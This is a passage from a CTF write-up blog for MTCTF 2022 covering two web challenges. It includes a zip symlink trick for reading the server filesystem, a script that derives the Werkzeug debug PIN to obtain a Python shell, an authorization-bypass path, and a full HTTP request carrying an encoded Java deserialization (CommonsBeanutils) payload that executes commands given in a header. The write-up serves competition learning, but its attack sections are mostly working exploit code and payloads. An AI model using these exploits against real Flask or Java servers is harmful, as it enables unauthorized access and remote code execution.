upload():</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    uploadpath = &#x27;uploads/&#x27; + md5(ip.encode()).hexdigest()[0:4]</span><br><span class="line"></span><br><span class="line">    if not os.path.exists(uploadpath):</span><br><span class="line">        os.makedirs(uploadpath)</span><br><span class="line"></span><br><span class="line">    if request.method == &#x27;GET&#x27;:</span><br><span class="line">        return redirect(&#x27;/&#x27;)</span><br><span class="line"></span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            upFile = request.files[&#x27;file&#x27;]</span><br><span class="line">            print(upFile.filename)</span><br><span class="line">            if os.path.splitext(upFile.filename)[-1]==&#x27;.zip&#x27;:</span><br><span class="line">                filepath=f&quot;&#123;uploadpath&#125;/&#123;md5(upFile.filename.encode()).hexdigest()[0:4]&#125;.zip&quot;</span><br><span class="line">                upFile.save(filepath)</span><br><span class="line">                zipDatas = extractFile(filepath)</span><br><span class="line">                return zipDatas</span><br><span class="line">            else:</span><br><span class="line">                return f&quot;&#123;upFile.filename&#125; is not a zip file !&quot;</span><br><span class="line">        except:</span><br><span class="line">            return make_response(&quot;error&quot;, 404)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=8000, debug=True)</span><br></pre></td></tr></table></figure>

<p>源码中调用了unzip用于解压，一开始想过能否利用绝对路径覆盖app.py，或者是在加压时写../路径覆盖，但都没成功。翻文档发现zip可以加压软链接，于是构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s / leak</span><br><span class="line">zip --symlinks -r go.zip leak</span><br></pre></td></tr></table></figure>

<p>上传go.zip即可在leak目录下访问根目录了，读取flag报错，提示没得权限，但是开了flask的debug，想到利用生成pin码来获得python shell</p>
<p>通过软链接我们可以收集到想要的各种信息， 参考网上的脚本改下下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import getpass</span><br><span class="line">from flask import Flask</span><br><span class="line">from itertools import chain</span><br><span class="line">import sys</span><br><span class="line">import uuid</span><br><span class="line">import typing as t</span><br><span class="line">username=&#x27;ctf&#x27;</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">modname=getattr(app, &quot;__module__&quot;, t.cast(object, app).__class__.__module__)</span><br><span class="line">mod=sys.modules.get(modname)</span><br><span class="line">mod = getattr(mod, &quot;__file__&quot;, None)</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    </span><br><span class="line">    username, #用户名</span><br><span class="line">    modname,  #一般固定为flask.app</span><br><span class="line">    getattr(app, &quot;__name__&quot;, app.__class__.__name__), #固定，一般为Flask</span><br><span class="line">    &#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;,   #主程序（app.py）运行的绝对路径</span><br><span class="line">]</span><br><span class="line">print(probably_public_bits)</span><br><span class="line">mac =&#x27;00:16:3e:32:77:b4&#x27;.replace(&#x27;:&#x27;,&#x27;&#x27;)</span><br><span class="line">mac=str(int(mac,base=16))</span><br><span class="line">private_bits = [</span><br><span class="line">   mac,#mac地址十进制</span><br><span class="line"> &quot;96cec10d3d9307792745ec3b85c89620ec5373919f640c761ee07622e5d7619c3b7ac6a99769414c62ae42b9c6836583&quot; #/etc/machine-id直接拼上/proc/self/cgroup</span><br><span class="line">     ]</span><br><span class="line">print(private_bits)</span><br><span class="line">h = hashlib.sha1()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&quot;utf-8&quot;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&quot;cookiesalt&quot;)</span><br><span class="line"></span><br><span class="line">cookie_name = f&quot;__wzd&#123;h.hexdigest()[:20]&#125;&quot;</span><br><span class="line"></span><br><span class="line"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span><br><span class="line"># end up with the same value and generate out 9 digits</span><br><span class="line">h.update(b&quot;pinsalt&quot;)</span><br><span class="line">num = f&quot;&#123;int(h.hexdigest(), 16):09d&#125;&quot;[:9]</span><br><span class="line"></span><br><span class="line"># Format the pincode in groups of digits for easier remembering if</span><br><span class="line"># we don&#x27;t have a result yet.</span><br><span class="line">rv=None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size == 0:</span><br><span class="line">            rv = &quot;-&quot;.join(</span><br><span class="line">                num[x : x + group_size].rjust(group_size, &quot;0&quot;)</span><br><span class="line">                for x in range(0, len(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br><span class="line"></span><br><span class="line"># 374-545-762</span><br></pre></td></tr></table></figure>

<p>获得python shell后，<code>os.popen(&#39;cat /ffffl111l1a44a4ggg&#39;).read() </code>即可</p>
<h3 id="easyjava"><a href="#easyjava" class="headerlink" title="easyjava"></a>easyjava</h3><p>给了jar包，一通分析，发现是个假登陆，于是回到研究路由鉴权上，搜了下<code>server.servlet.context-path=/web</code>这种配置并不安全会导致路由未授权访问，构造<code>/;/web/admin/hello</code>即可访问到该路由，然后就是反序列化了。这里黑名单了一些，但是cb可以用，正好收藏的github库<a target="_blank" rel="noopener" href="https://github.com/Ares-X/shiro-exploit/blob/master/shiro-exploit.py%E9%87%8C%E6%9C%89cb+tomcat%E5%9B%9E%E6%98%BE%E7%9A%84%EF%BC%8C%E5%80%9F%E7%94%A8%E4%B8%80%E4%B8%8B">https://github.com/Ares-X/shiro-exploit/blob/master/shiro-exploit.py里有cb+tomcat回显的，借用一下</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /;/web/admin/hello HTTP/1.1</span><br><span class="line">Host: 39.106.27.2:40009</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Testcmd: cat /flag</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 6637</span><br><span class="line"></span><br><span class="line">data=rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA%2Fb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y%2B%2FSZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB%2BAARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD%2F%2F%2F%2F%2FdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX%2BAYIVOACAAB4cAAADwPK%2Frq%2BAAAAMgDpAQAMRm9vRERsMlpGZjhZBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBABFGb29ERGwyWkZmOFkuamF2YQEACXdyaXRlQm9keQEAFyhMamF2YS9sYW5nL09iamVjdDtbQilWAQAkb3JnLmFwYWNoZS50b21jYXQudXRpbC5idWYuQnl0ZUNodW5rCAAJAQAPamF2YS9sYW5nL0NsYXNzBwALAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsMAA0ADgoADAAPAQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwwAEQASCgAMABMBAAhzZXRCeXRlcwgAFQEAAltCBwAXAQARamF2YS9sYW5nL0ludGVnZXIHABkBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsMABsAHAkAGgAdAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DAAfACAKAAwAIQEABjxpbml0PgEABChJKVYMACMAJAoAGgAlAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kBwAnAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DAApACoKACgAKwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwALQAuCgAEAC8BAAdkb1dyaXRlCAAxAQAJZ2V0TWV0aG9kDAAzACAKAAwANAEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24HADYBABNqYXZhLm5pby5CeXRlQnVmZmVyCAA4AQAEd3JhcAgAOgEABENvZGUBAApFeGNlcHRpb25zAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAPgEADVN0YWNrTWFwVGFibGUBAAVnZXRGVgEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwAQwBECgAMAEUBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24HAEcBAA1nZXRTdXBlcmNsYXNzDABJAC4KAAwASgEAFShMamF2YS9sYW5nL1N0cmluZzspVgwAIwBMCgBIAE0BACJqYXZhL2xhbmcvcmVmbGVjdC9BY2Nlc3NpYmxlT2JqZWN0BwBPAQANc2V0QWNjZXNzaWJsZQEABChaKVYMAFEAUgoAUABTAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQHAFUBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAVwBYCgBWAFkBABBqYXZhL2xhbmcvU3RyaW5nBwBbAQADKClWDAAjAF0KAAQAXgEAEGphdmEvbGFuZy9UaHJlYWQHAGABAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsMAGIAYwoAYQBkAQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7DABmAGcKAGEAaAEAB3RocmVhZHMIAGoMAEEAQgoAAgBsAQATW0xqYXZhL2xhbmcvVGhyZWFkOwcAbgEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwwAcABxCgBhAHIBAARleGVjCAB0AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoMAHYAdwoAXAB4AQAEaHR0cAgAegEABnRhcmdldAgAfAEAEmphdmEvbGFuZy9SdW5uYWJsZQcAfgEABnRoaXMkMAgAgAEAB2hhbmRsZXIIAIIBAAZnbG9iYWwIAIQBAApwcm9jZXNzb3JzCACGAQAOamF2YS91dGlsL0xpc3QHAIgBAARzaXplAQADKClJDACKAIsLAIkAjAEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwwAVwCOCwCJAI8BAANyZXEIAJEBAAtnZXRSZXNwb25zZQgAkwEACWdldEhlYWRlcggAlQEACFRlc3RlY2hvCACXAQAHaXNFbXB0eQEAAygpWgwAmQCaCgBcAJsBAAlzZXRTdGF0dXMIAJ0BAAlhZGRIZWFkZXIIAJ8BAAdUZXN0Y21kCAChAQAHb3MubmFtZQgAowEAEGphdmEvbGFuZy9TeXN0ZW0HAKUBAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7DACnAKgKAKYAqQEAC3RvTG93ZXJDYXNlDACrAHEKAFwArAEABndpbmRvdwgArgEAB2NtZC5leGUIALABAAIvYwgAsgEABy9iaW4vc2gIALQBAAItYwgAtgEAEWphdmEvdXRpbC9TY2FubmVyBwC4AQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyBwC6AQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgwAIwC8CgC7AL0BAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwwAvwDACgC7AMEBABFqYXZhL2xhbmcvUHJvY2VzcwcAwwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsMAMUAxgoAxADHAQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWDAAjAMkKALkAygEAAlxBCADMAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7DADOAM8KALkA0AEABG5leHQMANIAcQoAuQDTAQAIZ2V0Qnl0ZXMBAAQoKVtCDADVANYKAFwA1wwABwAICgACANkBAA1nZXRQcm9wZXJ0aWVzAQAYKClMamF2YS91dGlsL1Byb3BlcnRpZXM7DADbANwKAKYA3QEAE2phdmEvdXRpbC9IYXNodGFibGUHAN8BAAh0b1N0cmluZwwA4QBxCgDgAOIBABNbTGphdmEvbGFuZy9TdHJpbmc7BwDkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcA5goA5wBeACEAAgDnAAAAAAADAAoABwAIAAIAPAAAANwACAAFAAAAsRIKuAAQTi22ABRNLRIWBr0ADFkDEhhTWQSyAB5TWQWyAB5TtgAiLAa9AARZAytTWQS7ABpZA7cAJlNZBbsAGlkrvrcAJlO2ACxXKrYAMBIyBL0ADFkDLVO2ADUqBL0ABFkDLFO2ACxXpwBIOgQSObgAEE4tEjsEvQAMWQMSGFO2ACItBL0ABFkDK1O2ACxNKrYAMBIyBL0ADFkDLVO2ADUqBL0ABFkDLFO2ACxXpwADsQABAAAAaABrADcAAQBAAAAAEQAC9wBrBwA3%2FQBEBwAEBwAMAD0AAAAEAAEAPwAKAEEAQgACADwAAAB%2BAAMABQAAAD8BTSq2ADBOpwAZLSu2AEZNpwAWpwAAOgQttgBLTqcAAy0SBKb%2F5ywBpgAMuwBIWSu3AE6%2FLAS2AFQsKrYAWrAAAQAKABMAFgBIAAEAQAAAACUABv0ACgcAVgcADAj%2FAAIABAcABAcAXAcAVgcADAABBwBICQUNAD0AAAAEAAEAPwABACMAXQACADwAAAM2AAgADQAAAj8qtwDoAzYEuABltgBpEmu4AG3AAG86BQM2BhUGGQW%2BogIfGQUVBjI6BxkHAaYABqcCCRkHtgBzTi0SdbYAeZoADC0Se7YAeZoABqcB7hkHEn24AG1MK8EAf5oABqcB3CsSgbgAbRKDuABtEoW4AG1MpwALOginAcOnAAArEoe4AG3AAIk6CQM2ChUKGQm5AI0BAKIBnhkJFQq5AJACADoLGQsSkrgAbUwrtgAwEpQDvQAMtgA1KwO9AAS2ACxNK7YAMBKWBL0ADFkDElxTtgA1KwS9AARZAxKYU7YALMAAXE4tAaUACi22AJyZAAanAFgstgAwEp4EvQAMWQOyAB5TtgA1LAS9AARZA7sAGlkRAMi3ACZTtgAsVyy2ADASoAW9AAxZAxJcU1kEElxTtgA1LAW9AARZAxKYU1kELVO2ACxXBDYEK7YAMBKWBL0ADFkDElxTtgA1KwS9AARZAxKiU7YALMAAXE4tAaUACi22AJyZAAanAI0stgAwEp4EvQAMWQOyAB5TtgA1LAS9AARZA7sAGlkRAMi3ACZTtgAsVxKkuACqtgCtEq%2B2AHmZABgGvQBcWQMSsVNZBBKzU1kFLVOnABUGvQBcWQMStVNZBBK3U1kFLVM6DCy7ALlZuwC7WRkMtwC%2BtgDCtgDItwDLEs22ANG2ANS2ANi4ANoENgQtAaUACi22AJyZAAgVBJoABqcAECy4AN62AOO2ANi4ANoVBJkABqcACYQKAaf%2BXBUEmQAGpwAJhAYBp%2F3fsQABAF8AcABzAD8AAQBAAAAA3QAZ%2FwAaAAcHAAIAAAABBwBvAQAA%2FAAXBwBh%2FwAXAAgHAAIAAAcAXAEHAG8BBwBhAAAC%2FwARAAgHAAIHAAQABwBcAQcAbwEHAGEAAFMHAD8E%2FwACAAgHAAIHAAQABwBcAQcAbwEHAGEAAP4ADQAHAIkB%2FwBjAAwHAAIHAAQHAAQHAFwBBwBvAQcAYQAHAIkBBwAEAAAC%2BwBULgL7AE1RBwDlKQsEAgwH%2FwAFAAsHAAIHAAQABwBcAQcAbwEHAGEABwCJAQAA%2FwAHAAgHAAIAAAABBwBvAQcAYQAA%2BgAFAD0AAAAEAAEAPwABAAUAAAACAAZ1cQB%2BABAAAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ%2BAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHEAfgANeA%3D%3D</span><br><span class="line"></span><br></pre></td></tr></table></figure>


  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/paper/">Paper</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easypickle"><span class="toc-number">1.1.</span> <span class="toc-text">easypickle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyjava"><span class="toc-number">1.2.</span> <span class="toc-text">babyjava</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OnlineUnzip"><span class="toc-number">1.3.</span> <span class="toc-text">OnlineUnzip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyjava"><span class="toc-number">1.4.</span> <span class="toc-text">easyjava</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://w1mps.github.io/2022/09/17/MTCTF%202022/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://w1mps.github.io/2022/09/17/MTCTF%202022/&text=NS - MTCTF 2022"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://w1mps.github.io/2022/09/17/MTCTF%202022/&title=NS - MTCTF 2022"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://w1mps.github.io/2022/09/17/MTCTF%202022/&is_video=false&description=NS - MTCTF 2022"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=NS - MTCTF 2022&body=Check out this article: http://w1mps.github.io/2022/09/17/MTCTF%202022/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://w1mps.github.io/2022/09/17/MTCTF%202022/&title=NS - MTCTF 2022"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://w1mps.github.io/2022/09/17/MTCTF%202022/&title=NS - MTCTF 2022"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://w1mps.github.io/2022/09/17/MTCTF%202022/&title=NS - MTCTF 2022"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://w1mps.github.io/2022/09/17/MTCTF%202022/&title=NS - MTCTF 2022"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://w1mps.github.io/2022/09/17/MTCTF%202022/&name=NS - MTCTF 2022&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://w1mps.github.io/2022/09/17/MTCTF%202022/&t=NS - MTCTF 2022"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <!-- <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script> -->

    <div class="footer-center">
      Copyright &copy;
      
      
      2021-2022
      Powered by
      outx
      <!-- (<span id="busuanzi_value_site_pv"></span>) -->
    </div>
  
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/paper/">Paper</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </nav>
  </div>
  <br>

</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


</body>
</html>
